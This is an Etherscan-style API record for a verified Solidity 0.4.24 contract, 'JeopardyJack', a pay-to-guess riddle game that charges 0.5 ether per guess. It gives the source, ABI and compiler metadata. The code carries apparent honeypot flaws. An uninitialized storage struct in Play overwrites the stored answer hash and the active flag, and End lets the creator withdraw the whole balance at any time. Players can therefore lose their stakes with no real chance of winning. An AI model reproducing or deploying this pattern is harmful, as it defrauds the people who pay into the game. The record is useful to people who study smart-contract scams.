{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\ncontract JeopardyJack {\r\n    bytes32 private answerHash;\r\n    uint private isActive;\r\n    Guess[] public Guesses;\r\n    string public Riddle;\r\n    string public Answer;\r\n\r\n    struct Guess { address player; string guess; }\r\n    address private riddler;\r\n\r\n    function () payable public {}\r\n    \r\n    function Start(string _riddle, bytes32 _answerHash) public payable {\r\n        if (riddler == 0x0) {\r\n            riddler = msg.sender;\r\n            Riddle = _riddle;\r\n            answerHash = _answerHash;\r\n            isActive = now;\r\n        }\r\n    }\r\n\r\n    function Play(string guess) public payable {\r\n        require(isActive > 0 && msg.value >= 0.5 ether);\r\n        if (bytes(guess).length == 0) return;\r\n        \r\n        Guess newGuess;\r\n        newGuess.player = msg.sender;\r\n        newGuess.guess = guess;\r\n        Guesses.push(newGuess);\r\n\r\n        if (keccak256(guess) == answerHash) {\r\n            Answer = guess;\r\n            isActive = 0;\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function End(string _answer) public {\r\n        if (msg.sender == riddler) {\r\n            Answer = _answer;\r\n            isActive = 0;\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"Answer\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_answer\",\"type\":\"string\"}],\"name\":\"End\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_riddle\",\"type\":\"string\"},{\"name\":\"_answerHash\",\"type\":\"bytes32\"}],\"name\":\"Start\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Riddle\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guess\",\"type\":\"string\"}],\"name\":\"Play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Guesses\",\"outputs\":[{\"name\":\"player\",\"type\":\"address\"},{\"name\":\"guess\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"JeopardyJack","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://c9e75686196f9bea8cdcffe949a022ba179c5aab210832be61ac04b854e82a42"}]}